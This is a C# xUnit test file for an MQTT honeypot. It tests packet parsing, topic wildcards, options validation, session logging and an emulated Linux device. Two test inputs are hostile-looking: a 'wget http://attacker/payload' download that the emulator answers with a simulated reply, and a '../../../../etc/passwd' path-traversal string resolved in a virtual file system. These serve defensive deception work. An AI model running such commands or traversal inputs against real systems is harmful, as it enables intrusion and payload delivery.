using System.Text.Json;
using Microsoft.Extensions.Options;
using TelemoqNet.Api.Configuration;
using TelemoqNet.Api.Emulation;
using TelemoqNet.Api.Logging;
using TelemoqNet.Api.Mqtt.Broker;
using TelemoqNet.Api.Mqtt.Protocol;
using Xunit;

namespace TelemoqNet.IntegrationTests;

public sealed class ComponentTests
{
    [Fact]
    public void PacketReader_HandlesFragmentedAndCoalescedPackets()
    {
        var reader = new MqttPacketReader(128);
        reader.Append([0xc0]);
        Assert.Equal(MqttReadStatus.NeedMoreData, reader.Read().Status);

        reader.Append([0, 0xd0, 0]);
        Assert.Equal(MqttPacketType.PingReq, reader.Read().Packet!.Type);
        Assert.Equal(MqttPacketType.PingResp, reader.Read().Packet!.Type);
    }

    [Fact]
    public void PacketReader_RejectsOversizedPackets()
    {
        var reader = new MqttPacketReader(128);
        reader.Append([0x30, 0x81, 0x01]);

        var result = reader.Read();

        Assert.Equal(MqttReadStatus.ProtocolError, result.Status);
        Assert.Equal("packet_too_large", result.Error);
    }

    [Theory]
    [InlineData("home/+/temperature", "home/kitchen/temperature", true)]
    [InlineData("home/#", "home/kitchen/temperature", true)]
    [InlineData("#", "$SYS/broker/version", false)]
    [InlineData("home/kitchen", "home/kitchen/temperature", false)]
    public void TopicFilter_MatchesMqttWildcards(
        string filter,
        string topic,
        bool expected) =>
        Assert.Equal(expected, TopicFilter.Matches(filter, topic));

    [Fact]
    public void VirtualFileSystem_ResolvesPathsWithoutEscapingRoot()
    {
        var fileSystem = new VirtualFileSystem();
        fileSystem.Add(new VirtualFile("/root/evidence", string.Empty, IsDirectory: true));
        fileSystem.Add(new VirtualFile("/root/evidence/note.txt", "captured"));

        Assert.Equal("/root/evidence/note.txt",
            VirtualFileSystem.ResolvePath("/root/evidence", "note.txt"));
        Assert.Equal("/etc/passwd",
            VirtualFileSystem.ResolvePath("/root/evidence", "../../../../etc/passwd"));
        Assert.True(fileSystem.TryRead("/root/evidence/note.txt", out var contents));
        Assert.Equal("captured", contents);
    }

    [Fact]
    public async Task GenericLinuxDevice_ExecutesOnlySimulatedCommands()
    {
        var device = new GenericLinuxDevice(Options.Create(new HoneypotOptions
        {
            CommandLatencyMilliseconds = 0
        }));

        var echo = await device.ExecuteCommandAsync("echo evidence", CancellationToken.None);
        var download = await device.ExecuteCommandAsync("wget http://attacker/payload", CancellationToken.None);

        Assert.Equal("\r\nevidence", echo);
        Assert.Contains("simulated", download);
    }

    [Fact]
    public void OptionsValidator_RejectsInvalidBounds()
    {
        var options = new MqttOptions
        {
            MaxPacketSize = 64,
            MaxTopicLevels = 0,
            ResponseJitterMinMs = 100,
            ResponseJitterMaxMs = 10
        };

        var result = new MqttOptionsValidator().Validate(Options.DefaultName, options);

        Assert.False(result.Succeeded);
        Assert.Contains(result.Failures!, failure => failure.Contains("MaxPacketSize"));
        Assert.Contains(result.Failures!, failure => failure.Contains("MaxTopicLevels"));
        Assert.Contains(result.Failures!, failure => failure.Contains("jitter"));
    }

    [Fact]
    public void SessionSerialization_PreservesStructuredEvents()
    {
        var session = new HoneypotSession
        {
            SessionId = Guid.NewGuid(),
            StartedAt = DateTimeOffset.UtcNow,
            Protocol = "mqtt",
            RemoteEndpoint = "127.0.0.1:1883"
        };
        session.Events.Add(new SessionEvent(1, "mqtt.publish", session.StartedAt, "length=3"));

        var json = JsonSerializer.Serialize(session);
        Assert.Contains("\"Protocol\":\"mqtt\"", json);
        Assert.Contains("\"Type\":\"mqtt.publish\"", json);
    }
}
